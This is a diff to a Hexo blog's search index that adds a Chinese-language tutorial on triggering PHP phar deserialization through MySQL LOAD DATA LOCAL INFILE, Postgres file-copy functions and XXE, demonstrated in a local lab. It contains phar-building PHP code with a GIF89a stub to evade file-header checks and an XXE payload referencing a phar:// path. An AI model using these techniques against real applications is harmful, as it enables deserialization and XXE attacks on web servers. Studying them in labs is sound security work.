@@ -20,4 +20,81 @@
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>sql和xxe配合phar反序列化</title>
+    <url>/2021/10/01/sql%E5%92%8Cxxe%E9%85%8D%E5%90%88phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h2 id="mysql-触发反序列化漏洞"><a href="#mysql-触发反序列化漏洞" class="headerlink" title="mysql 触发反序列化漏洞"></a>mysql 触发反序列化漏洞</h2><p>php调用mysql的语句 LOAD DATA LOCAL INFILE 导入phar文件能触发phar的反序列化语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD DATA LOCAL INFILE</span><br></pre></td></tr></table></figure>
+
+<p>作用，通过文件批量给表添加数据的操作</p>
+<p>完整语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD DATA LOCAL INFILE &#x27;1.txt&#x27; into table user;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE ctf1;</span><br><span class="line"></span><br><span class="line">use ctf1;</span><br><span class="line"></span><br><span class="line">CREATE TABLE users (id VARCHAR(100) NOT NULL,username VARCHAR(100) NOT NULL,password VARCHAR(100) NOT NULL);</span><br></pre></td></tr></table></figure>
+
+<p>演示</p>
+<p>首先我们创建一个<code>users.xlsx</code>文件,准备数据如下图:</p>
+<p><img src="https://i.loli.net/2021/10/01/kmdOUq7vloBX3JT.png" alt="image-20211001160458332"></p>
+<p>然后新建<code>users.txt</code>文件,将数据复制过去;</p>
+<p><img src="https://i.loli.net/2021/10/01/Lvoj7uxeOSIh3ms.png" alt="image-20211001161446448"></p>
+<p>试一试结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD DATA LOCAL INFILE &#x27;D:\\users.txt&#x27; into table users;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.loli.net/2021/10/01/k5qMf6hLJ83bcNC.png" alt="image-20211001161704460"></p>
+<p>奇奇怪怪不知道为什么看不到 id</p>
+<p><img src="https://i.loli.net/2021/10/01/m5ni3Sr4KOwcA7C.png" alt="image-20211001161740670"></p>
+<p>但是这样却还能行，先不管了。</p>
+<p>那么如果这个文件是利用了<code>phar协议</code>处理了的<code>phar</code>文件，格式如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD DATA LOCAL INFILE &#x27;phar://phar.phar/test.txt&#x27; into table user;</span><br></pre></td></tr></table></figure>
+
+<p>尝试一下，但是提示<code>warning</code>，<code> LOAD DATA LOCAL INFILE forbidden</code></p>
+<p>这是因为还要修改mysql中的<code>my.ini</code>中的配置，因此可以看出这种利用前提不是默认的，需要人为定义，添加下面的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local-infile=1</span><br><span class="line">secure_file_priv=&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>除了在<code>my.ini</code>中配置以外，还有个坑，在<code>php.ini</code>中需要将<code>mysqli.allow_local_infile</code>前面的注释去掉</p>
+<p>生成phar文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	//反序列化payload构造</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    //设置stub，GIF89a可以改成其他的字段，绕过文件头检验，但必须以 __HALT_COMPILER(); ?&gt; 结尾</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); </span><br><span class="line"></span><br><span class="line">	//将反序列化的对象放入该文件中</span><br><span class="line">    $o = new TestObject();</span><br><span class="line">    $o-&gt;data=&#x27;just a test&#x27;;</span><br><span class="line">    $phar-&gt;setMetadata($o);</span><br><span class="line"></span><br><span class="line">	//phar本质上是个压缩包，所以要添加压缩的文件和文件内容</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); </span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>创建这样一个php文件，直接使用连接数据库执行LOAD DATA LOCAL INFILE操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class TestObject&#123;</span><br><span class="line">		function __destruct()&#123;</span><br><span class="line">			echo $this-&gt;data;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$m = mysqli_init();</span><br><span class="line">	mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);</span><br><span class="line">	$s = mysqli_real_connect($m, &#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;root&#x27;, &#x27;ctf1&#x27;, 3306);</span><br><span class="line">	$p = mysqli_query($m, &#x27;LOAD DATA LOCAL INFILE \&#x27;phar://D:/phpStudy/PHPTutorial/WWW/phar.phar/test.txt\&#x27; INTO TABLE users&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>刷新页面</p>
+<p><img src="https://i.loli.net/2021/10/01/XZhBD4R6Mw8EGbv.png" alt="image-20211001162844470"></p>
+<p>成功反序列化</p>
+<h2 id="Postgres"><a href="#Postgres" class="headerlink" title="Postgres"></a>Postgres</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;test&quot;, &quot;root&quot;, &quot;root&quot;));</span><br><span class="line">@$pdo-&gt;pgsqlCopyFromFile(&#x27;aa&#x27;, &#x27;phar://test.phar/aa&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>当然，pgsqlCopyToFile和pg_trace同样也是能使用的，只是它们需要开启phar的写功能。</p>
+<h2 id="通过XXE触发反序列化"><a href="#通过XXE触发反序列化" class="headerlink" title="通过XXE触发反序列化"></a>通过XXE触发反序列化</h2><p>当网页存在xxe漏洞和文件上传漏洞时，可以使用phar协议来触发phar反序列化</p>
+<p>这里使用xxe-lab 作为演示</p>
+<p>在doLogin.php中插入 include ‘index.php’;</p>
+<p>index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class TestObject&#123;</span><br><span class="line">		function __destruct()&#123;</span><br><span class="line">			echo $this-&gt;data;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Mikasa [</span><br><span class="line">&lt;!ENTITY test SYSTEM  &quot;phar://phar.phar/test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.loli.net/2021/10/01/6PETRpyOVo3I8Gt.png" alt="image-20211001182755012"></p>
+<p><a href="https://www.cnblogs.com/sijidou/p/13121358.html">https://www.cnblogs.com/sijidou/p/13121358.html</a></p>
+<p><a href="https://xz.aliyun.com/t/6699#toc-3">https://xz.aliyun.com/t/6699#toc-3</a></p>
+]]></content>
+      <categories>
+        <category>反序列化</category>
+      </categories>
+      <tags>
+        <tag>PHP反序列化</tag>
+        <tag>xxe</tag>
+      </tags>
+  </entry>
 </search>
